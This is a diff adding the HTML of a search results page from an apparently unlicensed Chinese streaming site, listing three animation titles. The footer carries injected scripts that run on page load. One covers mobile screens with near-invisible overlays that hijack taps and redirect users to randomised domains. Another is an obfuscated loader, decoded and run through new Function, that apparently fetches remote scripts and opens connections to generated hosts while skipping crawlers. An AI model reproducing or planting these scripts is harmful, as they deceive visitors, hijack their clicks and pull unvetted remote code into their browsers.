@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!--    <meta name="referrer" content="no-referrer">-->
+    <link rel="icon" type="image/webp" href="/img/favicon.webp">
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <!-- logo 由 common.css 通过 background:url() 引用，浏览器要先解析完 CSS 才发现，
+         preload 让它与 CSS 并行下载，首屏 header 出现更早。fetchpriority=high 提示优先级。 -->
+    <link rel="preload" as="image" href="/img/logo.png" fetchpriority="high">
+    <link rel="stylesheet" href="/css/bs-lite.css?v=2026092401">
+    <link rel="stylesheet" href="/css/base.css?v=2026092401">
+    <link rel="stylesheet" href="/css/common.css?v=2026100902">
+    <link rel="stylesheet" href="/css/motion.css?v=2026101501">
+    
+    <script defer src="/js/play-history.js?v=2026100901"></script>
+    
+    <title>搜索：灵境 - 极速追剧</title>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/css/search.css?v=2026092401">
+    
+</head>
+<!-- 播放页顶栏随页面滚动，不需要给固定导航栏留位，body 的 padding-top 由 play.css 归零 -->
+<body>
+<header>
+    <header>
+        <div class="header">
+        <div class="container1">
+
+            <div class="logo">
+                <div>
+                    <a href="/" title="极速追剧">极速追剧</a>
+                </div>
+            </div>
+            <nav class="nav">
+                <ul>
+                    <li><a href="/">首页</a></li>
+                    <li><a href="/type/dianshiju.html">电视剧</a></li>
+                    <li><a href="/type/dianying.html">电影</a></li>
+                    <li><a href="/type/dongman.html">动漫</a></li>
+                    <li><a href="/type/zongyi.html">综艺</a></li>
+                    <li><a href="/message">留言</a></li>
+                    <li><a href="/app" style="color: #c62828">APP下载</a></li>
+                </ul>
+            </nav>
+        </div>
+        <div class="container2">
+            <div class="header-actions">
+                <a href="/search" class="action-btn" title="搜索">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                    </svg>
+                </a>
+                <!--
+                  收藏 + 最近观看两个下拉。
+                  这里的 class 与 id 是 play-history.js mountDropdown 的挂载契约
+                  （favBox / favToggle / favPanel / favList / favEmpty / favClear，historyBox 同理），
+                  改名必须连 JS 一起改；也正因为这份契约，全站只能存在一套，不能为了播放页顶栏再渲染一份。
+                -->
+                <div class="history-box" id="favBox">
+                    <a href="#" class="action-btn" id="favToggle" title="我的收藏"
+                       aria-haspopup="true" aria-expanded="false">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg>
+                    </a>
+                    <div class="history-panel" id="favPanel">
+                        <div class="history-panel-header">
+                            <span class="history-panel-title">我的收藏</span>
+                            <button type="button" class="history-clear" id="favClear">清空</button>
+                        </div>
+                        <div class="history-list" id="favList"></div>
+                        <div class="history-empty" id="favEmpty">还没有收藏影片</div>
+                    </div>
+                </div>
+                <div class="history-box" id="historyBox">
+                    <a href="#" class="action-btn" id="historyToggle" title="最近观看"
+                       aria-haspopup="true" aria-expanded="false">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <polyline points="12 6 12 12 16 14"></polyline>
+                        </svg>
+                    </a>
+                    <div class="history-panel" id="historyPanel">
+                        <div class="history-panel-header">
+                            <span class="history-panel-title">最近观看</span>
+                            <button type="button" class="history-clear" id="historyClear">清空</button>
+                        </div>
+                        <div class="history-list" id="historyList"></div>
+                        <div class="history-empty" id="historyEmpty">还没有观看记录</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+    </header>
+</header>
+
+<main class="main search-page-main">
+    <div class="container search-page-container page-container">
+
+        
+
+        <div>
+            <div class="search-summary">
+                <span>
+                    搜索
+                    <em class="search-field-badge"></em>
+                    "<em>灵境</em>"
+                </span>
+                <span class="divider"></span>
+                <span>共 <em>3</em> 个结果</span>
+                <span class="divider"></span>
+                <div class="sort-tabs">
+                    <a href="/search?keyword=%E7%81%B5%E5%A2%83&amp;field=all&amp;sort=hits"
+                       class="sort-tab active">热度排序</a>
+                    <a href="/search?keyword=%E7%81%B5%E5%A2%83&amp;field=all&amp;sort=year"
+                       class="sort-tab">年份排序</a>
+                </div>
+            </div>
+
+            <div class="search-result-card">
+                <div class="search-list">
+                    <div class="search-item">
+                        <a href="/detail/702.html" class="search-item-poster">
+                            <img src="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0" alt="灵境行者封面图片"
+                                 width="120" height="160" loading="lazy" decoding="async" referrerpolicy="no-referrer">
+                            
+                            
+                        </a>
+                        <div class="search-item-info">
+                            <div class="search-item-head">
+                                <a href="/detail/702.html" class="search-item-title text-decoration-none">灵境行者</a>
+                                <span class="search-item-type">动漫</span>
+                            </div>
+                            <div class="search-item-meta-cols">
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">主演：</span>
+                                    <span class="search-meta-value">未知</span>
+                                </div>
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">类型：</span>
+                                    <span class="search-meta-value">奇幻,冒险,中国动漫 · 2026 · 中国大陆</span>
+                                </div>
+                                <div class="search-meta-item search-meta-desc">
+                                    <span class="search-meta-label">简介：</span>
+                                    <span class="search-meta-value">《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，...</span>
+                                </div>
+                            </div>
+                            <a href="/detail/702.html" class="search-item-btn">查看详情</a>
+                        </div>
+                    </div>
+                    <div class="search-item">
+                        <a href="/detail/148643.html" class="search-item-poster">
+                            <img src="https://img.jisuimage.com/cover/206f315125926725415fc1e92408f361.jpg" alt="开心锤锤Story灵境游戏封面图片"
+                                 width="120" height="160" loading="lazy" decoding="async" referrerpolicy="no-referrer">
+                            
+                            
+                        </a>
+                        <div class="search-item-info">
+                            <div class="search-item-head">
+                                <a href="/detail/148643.html" class="search-item-title text-decoration-none">开心锤锤Story灵境游戏</a>
+                                <span class="search-item-type">动漫</span>
+                            </div>
+                            <div class="search-item-meta-cols">
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">主演：</span>
+                                    <span class="search-meta-value">未知</span>
+                                </div>
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">类型：</span>
+                                    <span class="search-meta-value">奇幻,励志,穿越,中国动漫 · 2026 · 中国大陆</span>
+                                </div>
+                                <div class="search-meta-item search-meta-desc">
+                                    <span class="search-meta-label">简介：</span>
+                                    <span class="search-meta-value">高中生锤锤的父母被一场车祸夺走性命，姐姐菲菲重伤垂危，百万医疗费将他逼入绝境。他意外被拉入“灵境”游戏，这里拥有神奇丹药和功法，灵者可在地图内搜集物资、激...</span>
+                                </div>
+                            </div>
+                            <a href="/detail/148643.html" class="search-item-btn">查看详情</a>
+                        </div>
+                    </div>
+                    <div class="search-item">
+                        <a href="/detail/145758.html" class="search-item-poster">
+                            <img src="https://pic8.iqiyipic.com/image/20260810/93/61/a_101337151_m_601_579_772.png" alt="灵境守护者封面图片"
+                                 width="120" height="160" loading="lazy" decoding="async" referrerpolicy="no-referrer">
+                            
+                            
+                        </a>
+                        <div class="search-item-info">
+                            <div class="search-item-head">
+                                <a href="/detail/145758.html" class="search-item-title text-decoration-none">灵境守护者</a>
+                                <span class="search-item-type">动漫</span>
+                            </div>
+                            <div class="search-item-meta-cols">
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">主演：</span>
+                                    <span class="search-meta-value">未知</span>
+                                </div>
+                                <div class="search-meta-item">
+                                    <span class="search-meta-label">类型：</span>
+                                    <span class="search-meta-value">职场,合家欢,励志,动漫 · 2026</span>
+                                </div>
+                                <div class="search-meta-item search-meta-desc">
+                                    <span class="search-meta-label">简介：</span>
+                                    <span class="search-meta-value">他蛰伏求生，远赴东海勇闯龙宫，深入地心搏杀远古巨兽。于绝境之中步步破局，一层层撕开仙界掩盖已久的惊天阴谋！</span>
+                                </div>
+                            </div>
+                            <a href="/detail/145758.html" class="search-item-btn">查看详情</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            
+
+            
+        </div>
+    </div>
+
+    
+    <script>
+        (function() {
+            var STORAGE_KEY = 'search_history';
+            var MAX_COUNT = 20;
+            var form = document.getElementById('searchForm');
+            var input = document.getElementById('searchInput');
+            var fieldSelect = document.getElementById('searchField');
+
+            /**
+             * 读取历史。兼容两种数据格式：
+             * - 老数据：['张三', '李四']（字符串数组）→ 自动升级为 {keyword, field:'all'}
+             * - 新数据：[{keyword:'张三', field:'actor'}, ...]
+             */
+            function getHistory() {
+                try {
+                    var raw = localStorage.getItem(STORAGE_KEY);
+                    var list = raw ? JSON.parse(raw) : [];
+                    if (!Array.isArray(list)) return [];
+                    return list.map(function(item) {
+                        if (typeof item === 'string') return { keyword: item, field: 'all' };
+                        if (item && typeof item.keyword === 'string') {
+                            return { keyword: item.keyword, field: item.field || 'all' };
+                        }
+                        return null;
+                    }).filter(Boolean);
+                } catch (e) { return []; }
+            }
+
+            function saveHistory(list) {
+                try {
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(list.slice(0, MAX_COUNT)));
+                } catch (e) { /* 隐私模式 / 配额满：静默降级，不影响搜索 */ }
+            }
+
+            function addHistory(keyword, field) {
+                keyword = keyword.trim();
+                if (!keyword) return;
+                // 去重规则：keyword + field 联合唯一
+                var list = getHistory().filter(function(it) {
+                    return !(it.keyword === keyword && it.field === field);
+                });
+                list.unshift({ keyword: keyword, field: field });
+                saveHistory(list);
+            }
+
+            function removeHistory(keyword, field) {
+                var list = getHistory().filter(function(it) {
+                    return !(it.keyword === keyword && it.field === field);
+                });
+                saveHistory(list);
+                renderHistory();
+            }
+
+            function fieldLabel(f) {
+                return f === 'name' ? '片名' : (f === 'actor' ? '演员' : '全部');
+            }
+
+            function renderHistory() {
+                var list = getHistory();
+                var tagsEl = document.getElementById('searchHistoryTags');
+                var emptyEl = document.getElementById('searchHistoryEmpty');
+                var clearBtn = document.getElementById('searchHistoryClearBtn');
+                if (!tagsEl || !emptyEl) return;
+
+                tagsEl.innerHTML = '';
+                if (list.length === 0) {
+                    emptyEl.style.display = '';
+                    tagsEl.style.display = 'none';
+                    if (clearBtn) clearBtn.style.display = 'none';
+                } else {
+                    emptyEl.style.display = 'none';
+                    tagsEl.style.display = '';
+                    if (clearBtn) clearBtn.style.display = '';
+                    list.forEach(function(it) {
+                        var item = document.createElement('span');
+                        item.className = 'search-history-item';
+
+                        var a = document.createElement('a');
+                        a.className = 'search-history-tag';
+                        a.href = '/search?keyword=' + encodeURIComponent(it.keyword) + '&field=' + it.field;
+                        // 显示"关键词 · 字段"，让用户一眼看出这条历史是搜什么的
+                        a.textContent = it.field === 'all' ? it.keyword : (it.keyword + ' · ' + fieldLabel(it.field));
+
+                        var del = document.createElement('button');
+                        del.className = 'search-history-delete';
+                        del.title = '删除';
+                        del.innerHTML = '&times;';
+                        del.addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            removeHistory(it.keyword, it.field);
+                        });
+
+                        item.appendChild(a);
+                        item.appendChild(del);
+                        tagsEl.appendChild(item);
+                    });
+                }
+            }
+
+            if (form && input) {
+                form.addEventListener('submit', function() {
+                    addHistory(input.value, fieldSelect ? fieldSelect.value : 'all');
+                });
+            }
+
+            // 输入框 placeholder 随字段选择动态变化，提示用户当前搜什么
+            if (fieldSelect && input) {
+                var placeholders = {
+                    all: '输入影片名称或演员...',
+                    name: '输入影片名称...',
+                    actor: '输入演员名...'
+                };
+                fieldSelect.addEventListener('change', function() {
+                    input.placeholder = placeholders[fieldSelect.value] || placeholders.all;
+                });
+            }
+
+            renderHistory();
+
+            window._renderSearchHistory = renderHistory;
+        })();
+
+        function clearSearchHistory() {
+            try { localStorage.removeItem('search_history'); } catch (e) { /* 忽略 */ }
+            if (window._renderSearchHistory) window._renderSearchHistory();
+        }
+
+        function jumpPage() {
+            var pageData = document.getElementById('pageData');
+            var keyword = pageData ? pageData.dataset.keyword : '';
+            var field = pageData ? pageData.dataset.field : 'all';
+            var totalPages = parseInt(pageData ? pageData.dataset.totalpages : 1);
+            var sort = pageData ? pageData.dataset.sort : 'hits';
+            var page = parseInt(document.querySelector('.page-jump-input').value);
+            if (isNaN(page) || page < 1) page = 1;
+            if (page > totalPages) page = totalPages;
+            window.location.href = '/search?keyword=' + encodeURIComponent(keyword)
+                + '&field=' + encodeURIComponent(field)
+                + '&page=' + page + '&sort=' + sort;
+        }
+        var pageInput = document.querySelector('.page-jump-input');
+        if (pageInput) {
+            pageInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') jumpPage();
+            });
+        }
+
+        function collapsePagination() {
+            if (window.innerWidth > 768) return;
+            var pageData = document.getElementById('pageData');
+            if (!pageData) return;
+            var currentPage = parseInt(pageData.dataset.currentpage);
+            var totalPages = parseInt(pageData.dataset.totalpages);
+            if (totalPages <= 5) return;
+            document.querySelectorAll('.page-num').forEach(function(el) {
+                var p = parseInt(el.dataset.page);
+                if (p === 1 || p === totalPages || (p >= currentPage - 1 && p <= currentPage + 1)) {
+                    el.style.display = '';
+                } else {
+                    el.style.display = 'none';
+                }
+            });
+        }
+        collapsePagination();
+        // 只在真正跨越 768px 断点时重算，避免高频 resize 反复全量扫描（与 detail.js 保持一致）
+        if (window.matchMedia) {
+            var mq = window.matchMedia('(max-width: 768px)');
+            var onBreakpoint = function () { collapsePagination(); };
+            if (mq.addEventListener) mq.addEventListener('change', onBreakpoint);
+            else if (mq.addListener) mq.addListener(onBreakpoint);
+        }
+    </script>
+</main>
+
+<footer>
+    <div class="site-footer">
+    <div class="footer-inner">
+        <div class="footer-main">
+
+            <!-- 品牌区 -->
+            <div class="footer-brand">
+                <a href="/" class="footer-logo" title="极速追剧">极速追剧</a>
+                <p class="footer-desc">海量高清影视免费在线观看，电视剧、电影、动漫、综艺一应俱全，更新快、播放流畅、画质清晰。</p>
+            </div>
+
+            <!-- 友情链接 -->
+            
+
+            <!-- 免责声明 -->
+            <div class="footer-col footer-col-wide">
+                <h4 class="footer-col-title">免责声明</h4>
+                <p class="footer-note">
+                    本站所有影片均收集自互联网公开资源，本站本身不存储、不制作、不上传任何视频内容，相关版权由原作者或发行方享有。若收录内容无意侵犯了您的权益，请联系我们，我们将在核实后第一时间删除。
+                </p>
+            </div>
+
+        </div>
+
+        <div class="footer-bottom">
+            <p>
+                © <span>2026</span>
+                <span>极速追剧</span> · 本站仅供学习交流，请勿用于任何商业用途
+                
+            </p>
+        </div>
+    </div>
+</div>
+</footer>
+
+<!-- 全站弹窗公告：后台「系统管理 → 弹窗设置」开启并配置内容后显示 -->
+
+
+<!-- 站点统计代码：后台「系统设置」中配置，原样注入到每个前台页面 -->
+<script>!function(p,u){var w=window,d=document,a=w.TJ1736=w.TJ1736||{};if(a.init){a.init(p);return;}(a.ids=a.ids||[]).push(p);if(a.loading)return;a.loading=true;var n=d.createElement("script");n.charset="UTF-8";n.async=true;n.src=u;n.id="TJ1736_COLLECT";n.onerror=function(){a.loading=false;};var r=d.getElementsByTagName("script")[0];if(r&&r.parentNode)r.parentNode.insertBefore(n,r);else(d.head||d.documentElement).appendChild(n);}({"id":"6ac641ad985777999d5b783766560dbf"},"https://tj.xddyy.com/tj/tongjiv5_code.min.js?v=5.2.8");</script>
+
+<!-- 手机端底飘广告：后台「系统设置 → 手机端底飘广告」配置，原样注入到每个前台页面 -->
+<script>;(function(){ function rd(e){var t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhijklmnopqrstuvwxyz",a = t.length,n = "";for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));return n;}; function sf(array){return new URLSearchParams( Object.entries(array).sort(() => Math.random() - 0.5) ).toString();} if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; bottom:"+(7.96875*n)+"vw; left:"+j*10+"vw; z-index:10;display:block;width:9.6vw;height:7.96875vw;background: #000;opacity:0.01;";document.write('<div class="faulmmwx_b" style="'+style+'"></div>');var a=document.getElementsByClassName("faulmmwx_b");a[i].addEventListener("touchend",function(){var faulmmwx_n="https://"+rd(3)+"8434gc.qiq15od.com"+":8005/cc/8434?"+rd(3)+"="+rd(3)+"&"+sf({is_not:1, target:1, ty:2}); if(typeof _paramet_!=="undefined"){faulmmwx_n+="&"+_paramet_;} if(top.location!=self.location){top.location=faulmmwx_n}else{window.location.href=faulmmwx_n}});i++}}}; })();</script>      <script>!function(){ function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`OimROfkztOl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 7_2(F6O2 5fcYa[Xd5 F 8 "ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7h6CSq^2OJ:5LF_XDRT4"=d 8 FmqY2pFh=2 8 ""!7O5 c6 8 0! 6 < Y! 6%%a 2 %8 Fm(hd5rFcydFhm7qOO5cydFhm5d2fO^ca . daa!5YF_52 2!P! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 7d_q^^DRM6LMDL87d_q^^DRM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@0o.c(q6Y2FD6fFh/K@0aaavv7d_q^^DRM6LMSS880a[7d_q^^DRM6LMSS8}!Xd5 7d_q^^DRM^8"hFFJLg//"%wdFYmJd5LYc2YD wdFYcaa%"{osop(m:6:}nOfm(O^"%"g{00n/((/{osoj"%5fcsa%"8"%5fcna%"v6LM2OF8}vFd5pYF8}"! 67cFTJYO7 MJd5d^YFMl88"_2fY762Yf"a[7d_q^^DRM^%8"v"%MJd5d^YFM!P 67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O287d_q^^DRM^PYqLY[D62fODmqO(dF6O2mh5Y787d_q^^DRM^P7d_q^^DRM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c1mQK{1n.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg1mQK{1nXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67c7d_q^^DRM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"{osop(m:6:}nOfm(O^"%"g{00n/f/{osoj(8}v287d_q^^DR"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"7d_q^^DRMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}n00aPP=}000a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?)fhO2O5)5ODLY5?yIIu5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"pDm0XsR4qKm(O^"="pDm}_F{h^)m(O^"="pDm}_F{h^)m(O^"="pDm_n4FT__m(O^"="pDm_n4FT__m(O^"="pDm0XsR4qKm(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//Q)7Y0}}@K7YYd)o"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Qn"%"/{oso"a! (mO2OJY287_2(F6O2cYa[7d_q^^DRM6LMDL87d_q^^DRM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"7d_q^^DRMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"{osopmL^_215Om(O^"%"g{00n\/L(/{osoj287d_q^^DR"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script>
+
+</body>
+</html>
